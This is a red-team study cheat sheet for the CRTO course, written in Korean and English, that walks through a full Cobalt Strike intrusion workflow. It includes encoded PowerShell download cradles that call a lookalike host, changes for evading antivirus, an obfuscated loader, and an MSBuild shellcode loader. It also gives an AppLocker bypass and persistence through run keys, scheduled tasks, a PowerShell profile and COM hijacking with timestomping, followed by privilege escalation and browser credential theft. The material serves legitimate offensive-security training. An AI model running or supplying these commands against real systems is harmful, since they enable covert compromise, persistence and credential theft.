# Certified Red Team Operator (CRTO)
- Course Link : https://www.zeropointsecurity.co.uk/course/red-team-ops
- Notion Link : https://www.notion.so/yallussallu/CRTO-2df206d737ba80f494edf2aa5730bdea?source=copy_link
- WorkFlow : https://miro.com/app/board/uXjVGBzFvek=/

## MISC
```
# Check outbound access to TeamServer (팀 서버 연결되는지 확인)
PS> iwr -Uri http://www.bleepincomputer.com/a

# Encode the powershell payload to base64 for handling extra quotes (Powershell 명령어 Base64로 인코딩)
## From Windows
PS> $str = 'IEX ((new-object net.webclient).downloadstring("http://bleepincomputer.com/a"))'
PS> [System.Convert]::ToBase64String([System.Text.Encoding]::Unicode.GetBytes($str))
## From Linux
$ echo -n "IEX(New-Object Net.WebClient).downloadString('http://bleepincomputer.com/a')" | iconv -t UTF-16LE | base64 -w 0

# Final Command to execute encoded payload (PowerShell 명령어 실행)
powershell -nop -enc [BASE64_PAYLOAD]
powershell -NoP -W H -ep ByP -e [BASE64_PAYLOAD]
```

## Defence Evasion
### Artifact Kit
- Artifact folder : C:\Tools\cobaltstrike\arsenal-kit\kits\artifact
```
## Step 1. patch.c의 45번째 줄 : for -> while 문으로 수정 (for svc exe payloads)
x = length;
while(x--) {
  *((char *)buffer + x) = *((char *)buffer + x) ^ key[x % 8];
}

## Step 2. patch.c의 116번째 줄 for문 → while 문으로 수정 (for normal exe payloads)
int x = length;
while(x--) {
  *((char *)ptr + x) = *((char *)buffer + x) ^ key[x % 8];
}

## Step 3. mailslot bypass template을 사용하여 artifact 제작
### ./build <techniques> <allocator> <stage size> <rdll size> <include resource file> <stack spoof> <syscalls> <output directory>
attacker@DESKTOP-FGSTPS7:~$ cd /mnt/c/Tools/cobaltstrike/arsenal-kit/kits/artifact
attacker@DESKTOP-FGSTPS7:/mnt/c/Tools/cobaltstrike/arsenal-kit/kits/artifact$ ./build.sh mailslot VirtualAlloc 344564 0 false false none /mnt/c/Tools/cobaltstrike/custom-artifacts

## Step 4. Load artifact.cna

## Step 5. 페이로드 제작 후 Anti-Virus에 의해 탐지되는 지 확인
PS C:\Tools\ThreatCheck\ThreatCheck\bin\Debug> .\ThreatCheck.exe -f C:\Payloads\dns_x64.svc.exe
```
### Resource Kit
- Resource folder : C:\Tools\cobaltstrike\arsenal-kit\kits\resource
```
## Step 1. Build Resource kit
attacker@DESKTOP-FGSTPS7:~$ cd /mnt/c/Tools/cobaltstrike/arsenal-kit/kits/resource
attacker@DESKTOP-FGSTPS7:/mnt/c/Tools/cobaltstrike/arsenal-kit/kits/resource$ ./build.sh /mnt/c/Tools/cobaltstrike/custom-resources

## Step 2. template.x64.ps1의 5번째 줄 코드 수정
`.Equals('System.dll')` → `.Equals('Sys'+'tem.dll')`

## Step 3. template.x64.ps1의 32번째 줄 코드 수정
$var_wpm = [System.Runtime.InteropServices.Marshal]::GetDelegateForFunctionPointer((func_get_proc_address kernel32.dll WriteProcessMemory), (func_get_delegate_type @([IntPtr], [IntPtr], [Byte[]], [UInt32], [IntPtr]) ([Bool])))
$ok = $var_wpm.Invoke([IntPtr]::New(-1), $var_buffer, $v_code, $v_code.Count, [IntPtr]::Zero)

## Step 4. compress.ps1 난독화
### %%DATA%% 는 난독화되지 않도록 해야함
PS> ipmo C:\Tools\Invoke-Obfuscation\Invoke-Obfuscation.psd1
PS> Invoke-Obfuscation
Invoke-Obfuscation> SET SCRIPTBLOCK '$s=New-Object IO.MemoryStream(,[Convert]::FromBase64String("%%DATA%%"));IEX (New-Object IO.StreamReader(New-Object IO.Compression.GzipStream($s,[IO.Compression.CompressionMode]::Decompress))).ReadToEnd();'
Invoke-Obfuscation> TOKEN\ALL\1

### compress.ps1 예시
SET-itEm  VarIABLe:WyizE ([tyPe]('conVE'+'Rt') ) ;  seT-variAbLe  0eXs  (  [tYpe]('iO.'+'COmp'+'Re'+'S'+'SiON.C'+'oM'+'P'+'ResSIonM'+'oDE')) ; ${s}=nEW-o`Bj`eCt IO.`MemO`Ry`St`REAM(, (VAriABle wYIze -val  )::"FR`omB`AsE64s`TriNG"("%%DATA%%"));i`EX (ne`w-`o`BJECT i`o.sTr`EAmRe`ADEr(NEw-`O`BJe`CT IO.CO`mPrESSi`oN.`gzI`pS`Tream(${s}, ( vAriable  0ExS).vALUE::"Dec`om`Press")))."RE`AdT`OEnd"();

## Step 5. Load resources.cna

## Step 6. 페이로드 제작 후 Anti-Virus에 의해 탐지되는 지 확인
PS C:\Tools\ThreatCheck\ThreatCheck\bin\Debug> .\ThreatCheck.exe -f C:\Payloads\New\dns_x64.ps1

## Step 7. 만약 탐지된다면, Artifact Kit 내의 script_template.cna 파일에서 모든 rundll32.exe를 dllhost.exe로 치환
```
### Malleable C2 Profile
- Malleable C2 Profile 경로 : /opt/cobaltstrike/profiles/default.profile
- 예시
	- https://github.com/threatexpress/malleable-c2
	- https://github.com/rsmudge/Malleable-C2-Profiles
```
## Step 1. Access team server with ssh (팀 서버 SSH 접근)
PS> ssh attacker@10.0.0.5

## Step 2. Malleable C2 Profile 수정
set sample_name "Amy Profile";
set sleeptime "2000";  # 2 Seconds
set jitter    "30";
set useragent "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/119.0.0.0 Safari/537.36";
set host_stage "true"; 

stage {
	set userwx "false"; 
	set module_x64 "Hydrogen.dll";
	set copy_pe_header "false";
}

post-ex {
	set pipename "Winsock2\\CatalogChangeListener-###-0,";
	set amsi_disable "true";
	set spawnto_x64 "%windir%\\sysnative\\dllhost.exe";
	set spawnto_x86 "%windir%\\syswow64\\dllhost.exe";
	set cleanup "true"; 
	set obfuscate "true";
	set smartinject "true";
	
	transform-x64 {
		strrep "ReflectiveLoader" "NetlogonMain";
		strrepex "ExecuteAssembly" "Invoke_3 on EntryPoint failed." "Assembly threw an exception";
		strrepex "PowerPick" "PowerShellRunner" "PowerShellEngine";
	}
}

process-inject {
	execute {
		NtQueueApcThread-s;
		NtQueueApcThread;
		SetThreadContext;
		RtlCreateUserThread;
		CreateThread;
	}
}

## Step 3. Restart team server (팀 서버 재시작)
attacker@ubuntu:~$ sudo /usr/bin/docker restart cobaltstrike-cs-1
```
### OPSEC
```
# Fork and run 이전에 context에 맞게 spawnto 대상을 지정해야 한다.
beacon> spawnto x64 "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe"
beacon> powerpick Start-Sleep -s 60

# jump psexec[64] 실행 전에 context에 맞게 ak-settings 대상을 지정해야 한다.
beacon> ak-settings spawnto_x64 C:\Windows\System32\svchost.exe
beacon> jump psexec64 lon-ws-1 smb

# PPID Spoofing : Beacon이 임의의 부모 프로세스 아래에서 프로세스를 생성할 수 있게 하여 보안 솔루션 탐지 우회
beacon> ppid 6648
beacon> spawnto x64 C:\Windows\System32\msiexec.exe
beacon> powerpick Start-Sleep -s 60
```
## Bypass AppLocker
### Enumerate
```
# Local System의 AppLocker 정책 조회
### 🔨 PowerShell
PS C:\Users\pchilds> Get-ChildItem 'HKLM:Software\Policies\Microsoft\Windows\SrpV2'
PS C:\Users\pchilds> Get-ChildItem 'HKLM:Software\Policies\Microsoft\Windows\SrpV2\Exe'
### 🔨 Native AppLocker cmdlet
PS C:\Users\pchilds> $policy = Get-AppLockerPolicy -Effective
PS C:\Users\pchilds> $policy.RuleCollections

# GPO를 통한 AppLocker 정책 조회
beacon> ldapsearch (objectClass=groupPolicyContainer) --attributes displayName,gPCFileSysPath
beacon> ls \\contoso.com\SysVol\contoso.com\Policies\{8ECEE926-7FEE-48CD-9F51-493EB5AD95DC}\Machine
beacon> download \\contoso.com\SysVol\contoso.com\Policies\{8ECEE926-7FEE-48CD-9F51-493EB5AD95DC}\Machine\Registry.pol
PS C:\Users\Attacker> Parse-PolFile -Path .\Desktop\Registry.pol
PS C:\Users\Attacker> Parse-PolFile -Path .\Desktop\Registry.pol
```
### Path Wildcards
### Writable Directories
%WINDIR%\* 에 비콘 페이로드 업로드
- C:\Windows\Tasks
- C:\Windows\Temp
- C:\windows\tracing
- C:\Windows\System32\spool\PRINTERS
- C:\Windows\System32\spool\SERVERS
- C:\Windows\System32\spool\drivers\color
### LOLBAS 
```
# MSEdge
PS> "C:\Program Files (x86)\Microsoft\Edge\Application\msedge.exe" --headless --disable-gpu-sandbox --gpu-launcher="C:\Windows\Tasks\smb3_x64.exe &&"

# MSBuild
## Step 1. Cobalt Strike 웹 서버에 페이로드 호스팅

## Step 2. .csproj 파일 작성
<Project ToolsVersion="4.0" xmlns="http://schemas.microsoft.com/developer/msbuild/2003">
  <Target Name="MSBuild">
   <MSBuildTest/>
  </Target>
   <UsingTask
    TaskName="MSBuildTest"
    TaskFactory="CodeTaskFactory"
    AssemblyFile="C:\Windows\Microsoft.Net\Framework\v4.0.30319\Microsoft.Build.Tasks.v4.0.dll" >
     <Task>
      <Code Type="Class" Language="cs">
        <![CDATA[

            using System;
            using System.Net;
            using System.Runtime.InteropServices;
            using Microsoft.Build.Framework;
            using Microsoft.Build.Utilities;

            public class MSBuildTest :  Task, ITask
            {
                public override bool Execute()
                {
                    byte[] shellcode;
                    using (var client = new WebClient())
                    {
                        client.BaseAddress = "http://www.bleepincomputer.com/";
                        shellcode = client.DownloadData("beacon.bin");
                    }
      
                    var hKernel = LoadLibrary("kernel32.dll");
                    var hVa = GetProcAddress(hKernel, "VirtualAlloc");
                    var hCt = GetProcAddress(hKernel, "CreateThread");

                    var va = Marshal.GetDelegateForFunctionPointer<AllocateVirtualMemory>(hVa);
                    var ct = Marshal.GetDelegateForFunctionPointer<CreateThread>(hCt);

                    var hMemory = va(IntPtr.Zero, (uint)shellcode.Length, 0x00001000 | 0x00002000, 0x40);
                    Marshal.Copy(shellcode, 0, hMemory, shellcode.Length);

                    var t = ct(IntPtr.Zero, 0, hMemory, IntPtr.Zero, 0, IntPtr.Zero);
                    WaitForSingleObject(t, 0xFFFFFFFF);

                    return true;
                }

            [DllImport("kernel32", CharSet = CharSet.Ansi)]
            private static extern IntPtr LoadLibrary([MarshalAs(UnmanagedType.LPStr)]string lpFileName);
    
            [DllImport("kernel32", CharSet = CharSet.Ansi)]
            private static extern IntPtr GetProcAddress(IntPtr hModule, string procName);

            [DllImport("kernel32")]
            private static extern uint WaitForSingleObject(IntPtr hHandle, uint dwMilliseconds);

            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            private delegate IntPtr AllocateVirtualMemory(IntPtr lpAddress, uint dwSize, uint flAllocationType, uint flProtect);
    
            [UnmanagedFunctionPointer(CallingConvention.StdCall)]
            private delegate IntPtr CreateThread(IntPtr lpThreadAttributes, uint dwStackSize, IntPtr lpStartAddress, IntPtr lpParameter, uint dwCreationFlags, IntPtr lpThreadId);

            }

        ]]>
      </Code>
    </Task>
  </UsingTask>
</Project>

## Step 3. MSBuild.exe로 .csproj 실행
PS> C:\Windows\Microsoft.Net\Framework64\v4.0.30319\MSBuild.exe test.csproj
```
### Rundll32
```
PS> C:\Windows\System32\rundll32.exe http_x64.dll,StartW
```
### PowerShell CLM
```
# Case-1 : PowerPick에서는 FullLanguage 인 경우
## Step 1. PowerShell CLM 확인
beacon> powershell $ExecutionContext.SessionState.LanguageMode
ConstrainedLanguage
beacon> powerpick $ExecutionContext.SessionState.LanguageMode
FullLanguage

## Step 2. PowerPick의 CLM이 FullLanguage 라면 그냥 실행
beacon> powerpick C:\Windows\Microsoft.Net\Framework64\v4.0.30319\MSBuild.exe test.csproj

# Case-2 : ConstrainedLanguage 에서 DLL 실행하는 방법
## Step 1. PowerShell CLM 확인
PS> $ExecutionContext.SessionState.LanguageMode

## Step 2. 악성 DLL 제작
#include <windows.h>
#include <stdio.h>

extern "C" __declspec(dllexport) BOOL execute() {
	MessageBox(NULL, L"Hello World", L"AppLocker Bypass", 0);
	return TRUE;
}

BOOL APIENTRY DllMain(HMODULE hModule, DWORD  ul_reason_for_call, LPVOID lpReserved)
{
	switch (ul_reason_for_call)
	{
	case DLL_PROCESS_ATTACH:
		return execute();
	case DLL_PROCESS_DETACH:
		break;
	case DLL_THREAD_ATTACH:
		break;
	case DLL_THREAD_DETACH:
		break;
	}
	return TRUE;
}

## Step 3. HKCU에 Step 3에서 만든 악성 DLL 이름으로 가짜 COM component 등록
PS> [System.Guid]::NewGuid()
PS> New-Item -Path 'HKCU:Software\Classes\CLSID' -Name '{6136e053-47cb-4fdd-84b1-381bc5f3edb3}'
PS> New-Item -Path 'HKCU:Software\Classes\CLSID\{6136e053-47cb-4fdd-84b1-381bc5f3edb3}' -Name 'InprocServer32' -Value 'C:\Windows\Tasks\bypass.dll'
PS> New-ItemProperty -Path 'HKCU:Software\Classes\CLSID\{6136e053-47cb-4fdd-84b1-381bc5f3edb3}\InprocServer32' -Name 'ThreadingModel' -Value 'Both'
PS> New-Item -Path 'HKCU:Software\Classes' -Name 'AppLocker.Bypass' -Value 'AppLocker Bypass'
PS> New-Item -Path 'HKCU:Software\Classes\AppLocker.Bypass' -Name 'CLSID' -Value '{6136e053-47cb-4fdd-84b1-381bc5f3edb3}'

## Step 4. 실행
PS> New-Object -ComObject AppLocker.Bypass
```

## Initial Access
```
```

## Initial Access 이후
```
# Create a new Session as child of current process (현재 권한으로 새로운 비콘 생성)
beacon> sleep 3600 25
beacon> spawn x64 [LISTENER]

# Inject a full Beacon payload (프로세스를 실행한 사람으로 사칭하여 새로운 비콘 생성)
beacon> ps
beacon> sleep 3600 25
beacon> inject <PID> x64 tcp-local
```

## Persistence
- 악성 파일 업로드 시, WindowsApps, LocalLow, Temp 폴더에 업로드 권장
- 파일 이름은 OPSEC을 위해 updater.exe, debug.exe 등으로 변경
### persistence-sharpersist.cna
```
https://github.com/Peco602/cobaltstrike-aggressor-scripts/tree/main/persistence-sharpersist
```
### Registry Run Keys
- 사용자 로그인 시 자동 실행
- 레지스트리 키 : HKCU:\Software\Microsoft\Windows\CurrentVersion\Run
```
## Step 1. Upload beacon payload (비콘 페이로드 업로드)
beacon> cd C:\Users\pchilds\AppData\Local\Microsoft\WindowsApps
beacon> upload C:\Payloads\http_x64.exe
beacon> mv http_x64.exe updater.exe

## Step 2. Set registry key (레지스트리 값 설정)
beacon> reg_set HKCU Software\Microsoft\Windows\CurrentVersion\Run Updater REG_EXPAND_SZ %LOCALAPPDATA%\Microsoft\WindowsApps\updater.exe

## Step 3. Query registry key (레지스트리 값 잘 들어갔는 지 확인)
beacon> reg_query HKCU Software\Microsoft\Windows\CurrentVersion\Run Updater
```
### Startup Folder
- 사용자 로그인 시 자동 실행
- Startup Folder 경로 : %APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup
```
## Step 1. Upload beacon payload (Startup 폴더에 비콘 페이로드 업로드)
beacon> cd C:\Users\pchilds\AppData\Roaming\Microsoft\Windows\Start Menu\Programs\Startup
beacon> upload C:\Payloads\http_x64.exe
beacon> mv http_x64.exe updater.exe
```
### Logon Script
- 사용자 로그인 시 자동 실행
- Registry Run 보다 조금 더 빠른 시점에 실행되며, 명령어가 종료될 때 까지 바탕화면을 띄우지 못함
```
## Step 1. Upload beacon payload (비콘 페이로드 업로드)
beacon> cd C:\Users\pchilds\AppData\Local\Microsoft\WindowsApps
beacon> upload C:\Payloads\http_x64.exe
beacon> mv http_x64.exe updater.exe

## Step 2. Set registry key (레지스트리 값 설정)
beacon> reg_set HKCU Environment UserInitMprLogonScript REG_EXPAND_SZ %USERPROFILE%\AppData\Local\Microsoft\WindowsApps\updater.exe
```
### PowerShell Profile
- 사용자가 새로운 PowerShell 창을 열 때 자동 실행
- PowerShell Profile 경로 : $HOME\Documents\WindowsPowerShell\Profile.ps1
```
## Step 1. Cobalt Strike 웹 서버에 페이로드 호스팅

## Step 2. Write Profile.ps1 (Profile.ps1 파일 작성)
$_ = Start-Job -ScriptBlock { iex (new-object net.webclient).downloadstring("http://bleepincomputer.com/a") }

## Step 3. Upload Profile.ps1 (타켓 PowerShell Profile 경로에 Profile.ps1 업로드)
beacon> mkdir C:\Users\pchilds\Documents\WindowsPowerShell
beacon> cd C:\Users\pchilds\Documents\WindowsPowerShell
beacon> upload C:\Payloads\Profile.ps1
```
### Scheduled Task (User 권한)
- 미리 정의된 트리거를 기반으로 작업 수행
- 아래 예제에서는 pchilds가 로그인 시 자동 실행
```
## Step 1. Upload beacon payload (비콘 페이로드 업로드)
beacon> cd C:\Users\pchilds\AppData\Local\Microsoft\WindowsApps
beacon> upload C:\Payloads\http_x64.exe
beacon> mv C:\Payloads\http_x64.exe updater.exe

## Step 2. Write xml (공격자 머신에 xml 작성)
<Task xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
	<Triggers>
		<LogonTrigger>
		    <Enabled>true</Enabled>
			<UserId>CONTOSO\pchilds</UserId>
	    </LogonTrigger>
	</Triggers>
	<Principals>
		<Principal>
			<UserId>CONTOSO\pchilds</UserId>
	    </Principal>
	</Principals>
	<Settings>
	    <AllowStartOnDemand>true</AllowStartOnDemand>
	    <Enabled>true</Enabled>
	    <Hidden>true</Hidden>
	</Settings>
	<Actions>
		<Exec>
			<Command>%LOCALAPPDATA%\Microsoft\WindowsApps\updater.exe</Command>
	    </Exec>
	</Actions>
</Task>

## Step 3. Create a new scheduled task (새로운 스케줄 작업 생성)
beacon> schtaskscreate \Beacon XML CREATE
```
### Scheduled Task (SYSTEM 권한)
- 미리 정의된 트리거를 기반으로 작업 수행
- 아래 예제에서는 시스템 부팅 시 자동 실행
```
## Step 1. Upload beacon payload (비콘 페이로드 실행)
beacon> cd C:\Windows\System32
beacon> upload C:\Payloads\http_x64.exe
beacon> mv http_x64.exe debug_svc.exe

## Step 2. Write xml (공격자 머신에 xml 작성)
<Task xmlns="http://schemas.microsoft.com/windows/2004/02/mit/task">
	<Triggers>
		<BootTrigger>
			<Enabled>true</Enabled>
		</BootTrigger>
	</Triggers>
	<Principals>
		<Principal>
			<UserId>NT AUTHORITY\SYSTEM</UserId>
			<RunLevel>HighestAvailable</RunLevel>
		</Principal>
	</Principals>
	<Settings>
		<AllowStartOnDemand>true</AllowStartOnDemand>
		<Enabled>true</Enabled>
		<Hidden>true</Hidden>
	</Settings>
	<Actions>
		<Exec>
			<Command>C:\Windows\System32\debug_svc.exe</Command>
		</Exec>
	</Actions>
</Task>

## Step 3. Create a new scheduled task (새로운 스케줄 작업 생성)
beacon> schtaskscreate \Beacon XML CREATE
```
### COM Hijacking
- 타겟이 Hijacking 한 프로세스 실행 시 트리거
- 레지스트리 키 : HKCU:\Software\Classes\CLSID\{AB8902B4-09CA-4bb6-B78D-A8F59079A8D5}\InprocServer32
- 악용 가능한 조건
	- COM 항목이 HKLM에서만 정의되고 HKCU에서 정의되지 않는 경우, 해당 CLSID에 대한 HKCU 에 새로운 항목을 작성하여 악성 코드 실행
	- COM component가 존재하지 않는 DLL 또는 EXE를 가리키는 경우
```
## Step 1. Process Monitor로 "ProcessName is ms-teams.exe", "Operation is RegOpenKey", "Path : InprocServer32 or LocalServer32", "Result is NAME NOT FOUND" 인 대상 찾아서 CLSID 확인
### LAB에서는 CLSID가 7D096C5F-AC08-4F1F-BEB7-5C22C517CE39 를 타겟으로 진행

## Step 2. Upload beacon payload (비콘 페이로드 업로드)
beacon> cd %LocalAppData%\Microsoft\TeamsMeetingAdd-in\1.25.14205\x64
beacon> upload C:\Payloads\http_x64.dll

## Step 3. opsec을 위해 DLL 이름 변경 및 파일 생성/수정/액세스 시간 수정
beacon> mv http_x64.dll Microsoft.Teams.HttpClient.dll
beacon> timestomp Microsoft.Teams.HttpClient.dll Microsoft.Teams.Diagnostics.dll

## Step 4. Set registry key (레지스트리 값 세팅)
beacon> reg_set HKCU "Software\Classes\CLSID\{7D096C5F-AC08-4F1F-BEB7-5C22C517CE39}\InprocServer32" "" REG_EXPAND_SZ "%LocalAppData%\Microsoft\TeamsMeetingAdd-in\1.25.14205\x64\Microsoft.Teams.HttpClient.dll"
beacon> reg_set HKCU "Software\Classes\CLSID\{7D096C5F-AC08-4F1F-BEB7-5C22C517CE39}\InprocServer32" "ThreadingModel" REG_SZ "Both"

## Step 5.Query registry key (레지스트리 값 잘 들어갔는지 확인)
beacon> reg_query HKCU "Software\Classes\CLSID\{7D096C5F-AC08-4F1F-BEB7-5C22C517CE39}\InprocServer32"
```
### Windows Service
- 새로운 Windows Service를 등록
- SYSTEM 권한으로만 가능
```
## Step 1. Upload beacon payload (비콘 페이로드 업로드)
beacon> cd C:\Windows\System32
beacon> upload C:\Payloads\beacon_x64.svc.exe
beacon> mv beacon_x64.svc.exe debug_svc.exe

## Step 2. Create a new service (새로운 서비스 생성)
beacon> sc_create dbgsvc "Debug Service" C:\Windows\System32\debug_svc.exe "Windows Debug Service" 0 2 3

## Step 3. Query service (서비스 잘 생성되었는지 확인)
beacon> sc_qc dbgsvc
```

## Post-Exploitation
```
# File System
beacon> ls
beacon> cd [Directory]
beacon> drives
beacon> file_browser
beacon> download [File]

# Process
beacon> ps
beacon> process_browser

# Job
beacon> jobs
beacon> jobkill [jid]

# VNC
beacon> desktop [pid] [x86|x64] [high|low]
beacon> desktop [high|low]

# Command
beacon> execute-assembly [EXE_FILE] [arguments]
beacon> inline-execute [C_FILE] [arguments]
beacon> shell [command] [arguments]
beacon> run [program] [arguments]

# Powershell
beacon> powershell-import [PS_Script]
beacon> powershell [commandlet] [arguments]
beacon> powerpick [commandlet] [arguments]
beacon> psinject [pid] [x86|x64] [commandlet] [arguments]

# ETC
beacon> keylogger [pid] [x86|x64]
beacon> clipboard
beacon> printscreen [pid] [x86|x64]
beacon> screenshot [pid] [x86|x64]
beacon> screenwatch [pid]
```

## Privilege Escalation
- 권한 상승은 TCP Beacon 으로 하는 것을 추천
### PATH Environment Variable
```
## Step 1. Check environment variable (환경변수 확인)
### 🔨 비콘 명령어
beacon> env
### 🔨 SharUp
beacon> execute-assembly C:\Tools\SharpUp\SharpUp\bin\Release\SharpUp.exe audit HijackablePaths

## Step 2. Scan writable directory (환경변수에 순서대로 쓰기권한 있는 폴더 확인)
beacon> cacls [Directory]

## Step 3. Upload beacon payload (비콘 페이로드 업로드)
beacon> cd [Directory]
beacon> upload C:\Payloads\dns_x64.exe
beacon> mv dns_x64.exe [FILENAME]
```
### Unquoted Paths
```
## Step 1. Check unquoted paths (프로그램 경로에 공백이 존재하는 서비스 확인)
### 🔨 비콘 명령어
beacon> sc_enum
### 🔨 PowerShell 명령어
beacon> powerpick Get-WmiObject Win32_Service | Where-Object { $_.StartMode -eq 'Auto' -and $_.PathName -notlike 'C:\Windows\*' -and $_.PathName -notmatch '^\s*\".*\".*$' } | Select-Object Name, DisplayName, PathName, StartMode
### 🔨 SharpUp
beacon> execute-assembly C:\Tools\SharpUp\SharpUp\bin\Release\SharpUp.exe audit UnquotedServicePath

## Step 2. Scan writable directory (앞에서부터 쓰기권한 있는 폴더 확인)
beacon> cacls [Directory]

## Step 3. Upload beacon payload (비콘 페이로드 업로드)
beacon> cd [Directory]
beacon> upload C:\Payloads\dns_x64.svc.exe
beacon> mv dns_x64.svc.exe [____]

## Step 4. Restart service (서비스 재시작)
beacon> sc_stop [Service]
beacon> sc_start [Service]
```
### Service File Permissions
```
## Step 1. Scan writable directory (서비스 바이너리 파일 쓰기권한 확인)
### 🔨 비콘 명령어
beacon> cacls [File_Path]
### 🔨 SharpUp
beacon> execute-assembly C:\Tools\SharpUp\SharpUp\bin\Release\SharpUp.exe audit ModifiableServiceBinaries

## Step 2. Stop service (서비스 중지)
beacon> sc_stop [Service]

## Step 3. Upload beacon payload (비콘 페이로드 업로드)
beacon> upload C:\Payloads\dns_x64.svc.exe
beacon> mv dns_x64.svc.exe [____]

## Step 4. Restart service (서비스 재시작)
beacon> sc_start [Service]
```
### Service Registry Permissions
- 레지스트리 값 : HKLM:\SYSTEM\CurrentControlSet\Service
```
## Step 1. Scan writable registry key (레지스트리 값 쓰기권한 확인)
### 🔨 PowerShell 명령어
beacon> powerpick Get-Acl -Path HKLM:\SYSTEM\CurrentControlSet\Services\[Service] | fl
### 🔨 SharpUp
beacon> execute-assembly C:\Tools\SharpUp\SharpUp\bin\Release\SharpUp.exe audit ModifiableServiceRegistry

## Step 2. Upload beacon payload (비콘 페이로드 업로드)
beacon> cd C:\Temp
beacon> upload C:\Payloads\dns_x64.exe

## Step 3. Stop service (서비스 중지)
beacon> sc_stop [Service]

## Step 4. Change registry key (레지스트리 값 세팅)
beacon> sc_config [Service] C:\Temp\dns_x64.exe 0 2

## Step 5. Restart service (서비스 재시작)
beacon> sc_start [Service]
```
### DLL Search Order Hijacking
- 검색 순서 : 실행 중인 디렉터리 -> System32 디렉터리 -> 16-bit System 디렉터리 -> Windows 디렉터리 -> 현재 작업 디렉터리 -> PATH 환경변수 디렉터리
- 호출하는 DLL 명을 미리 파악하고 있어야 악용 가능함
```
## Step 1. Scan DLL (취약점 존재하는 DLL 확인)
beacon> execute-assembly C:\Tools\SharpUp\SharpUp\bin\Release\SharpUp.exe audit ModifiableServiceRegistry

## Step 2. Scan writable directory (순서대로 쓰기권한 있는 폴더 확인)
beacon> cacls [Directory]

## Step 3. Upload beacon payload (비콘 페이로드 업로드)
beacon> cd [Directory]
beacon> upload C:\Payloads\dns_x64.dll
beacon> mv dns_x64.dll [____]
```
### Software Vulnerabilities
```
## Step 1. 공격자 머신에 .NET 가젯 생성
PS> ysoserial.exe -g TypeConfuseDelegate -f BinaryFormatter -c "powershell -nop -ep bypass -enc SQBFAFgAIAAoAE4AZQB3AC0ATwBiAGoAZQBjAHQAIABOAGUAdAAuAFcAZQBiAGMAbABpAGUAbgB0ACkALgBEAG8AdwBuAGwAbwBhAGQAUwB0AHIAaQBuAGcAKAAnAGgAdAB0AHAAOgAvAC8AMQAyADcALgAwAC4AMAAuADEAOgAzADEANAA5ADAALwAnACkA" -o raw --outputpath=C:\Payloads\data.bin

## Step 2. Upload beacon payload (비콘 페이로드 업로드)
beacon> cd C:\Temp
beacon> upload C:\Payloads\data.bin
```
### Elevator
- 높은 권한을 가진 새로운 비콘 세션 생성
```
beacon> elevate

# UAC
beacon> elevate uac-schtasks tcp-local

# WMI
## Step 1. Load Elevate Kit

## Step 2. MSI Install 관련 취약점 스캔
beacon> execute-assembly SharpUp.exe AlwaysInstallElevated

## Step 3. Privilege Escalation (권한 상승)
beacon> elevate msi-installer [listener]
```
### Exploit
- 관리자 권한으로 특정 명령어 실행
```
beacon> runasadmin

# UAC
## Step 1. Create PowerShell One-liner (비콘 페이로드 생성)

## Step 2. Privilege Escalation (권한 상승)
beacon> runasadmin uac-cmstplua powershell -nop -exec bypass -EncodedCommand [PowerShell_One-liner]
```
### Token Privilege
- 보통 서비스 계정은 서비스 사용자를 사칭해서 뭔가를 하기 때문에 권한 상승에 악용될 수 있는 권한을 갖고있는 경우가 많다.
```
## Step 1. Check Token Privilege
### 🔨 PowerShell 명령어
beacon> powerpick whoami /priv
### 🔨 Seatbelt
beacon> execute-assembly C:\Tools\Seatbelt\Seatbelt\bin\Release\Seatbelt.exe TokenPrivileges

## Step 2. 만약 SeImpersonatePrivilege 권한이 있다면 SwwetPotato로 권한 상승 가능
### https://github.com/CCob/SweetPotato
beacon> execute-assembly C:\Tools\SweetPotato\bin\Release\SweetPotato.exe -p "C:\Windows\ServiceProfiles\MSSQLSERVER\AppData\Local\Microsoft\WindowsApps\tcp-local_x64.exe"
beacon> connect localhost 1337
```

## Domain Recon
- BloodHound 비밀번호 : 
- GPO File Path : \\[도메인]\SysVol\[도메인]\Policies\{[GPO_GUID]}\Machine\Microsoft\Windows NT\SecEdit\GptTmpl.inf
```
## Step 1. Data 수집
beacon> ldapsearch (|(objectClass=domain)(objectClass=organizationalUnit)(objectClass=groupPolicyContainer)) --attributes *,ntsecuritydescriptor
beacon> ldapsearch (|(samAccountType=805306368)(samAccountType=805306369)(samAccountType=268435456)) --attributes *,ntsecuritydescriptor

## Step 2. BOFHound
attacker@DESKTOP-FGSTPS7:~$ cd /mnt/c/Users/Attacker/Desktop
attacker@DESKTOP-FGSTPS7:/mnt/c/Users/Attacker/Desktop$ scp -r attacker@10.0.0.5:/opt/cobaltstrike/logs .
attacker@DESKTOP-FGSTPS7:/mnt/c/Users/Attacker/Desktop$ bofhound -i logs/

## Step 3. GPO 조회 및 WMI Filter 체크
### gPCWQLFilter 값이 존재할 시, WMI FIlter 가 있는 것
beacon> ldapsearch (objectClass=groupPolicyContainer) --attributes displayName,gPCFileSysPath,distinguishedName,gPCWQLFilter

## Step 4. WMI Filter 내용 확인
beacon> ldapsearch (&(objectClass=msWMI-Som)(name={E91C83FB-ADBF-49D5-9E93-0AD41E05F411})) --attributes msWMI-Name,msWMI-Parm2

## Step 5. Download GPO File (GPO 파일 다운로드)
beacon> download [GPO_FILE]

## Step 6. GPO에 등록된 SID 정보 조회
beacon> ldapsearch (objectSid=[SID]) --attributes samAccountType,samAccountName,member

## Step 7. Check GPO Link (GPO의 영향 범위 확인)
beacon> ldapsearch (&(|(objectClass=organizationalUnit)(objectClass=domain))(gPLink=*{[GPO-GUID]}*)) --attributes objectClass,name

## Step 8. WMI Filter, GPO Link 고려하여 BloodHound에 Edge 추가
MATCH (c:Computer) WHERE c.distinguishedname ENDS WITH 'OU=Servers,DC=partner,DC=com' AND c.operatingsystem =~ 'Windows 10.*' // WMI 필터 조건이 있다면 추가 MATCH (g:Group {objectid: 'S-1-5-21...-1107'}) MERGE (g)-[:AdminTo]->(c)
```

## Credential Access
### Credentials from Web Browsers
```
beacon> execute-assembly C:\Tools\SharpDPAPI\SharpChrome\bin\Release\SharpChrome.exe logins
```
### Windows Credential Manager
- 로컬 자격 증명 폴더 경로 : %USERPROFILE%\AppData\Local\Microsoft\Credentials
- 로밍 자격 증명 폴더 경로 : %USERPROFILE%\AppData\Roaming\Microsoft\Credentials
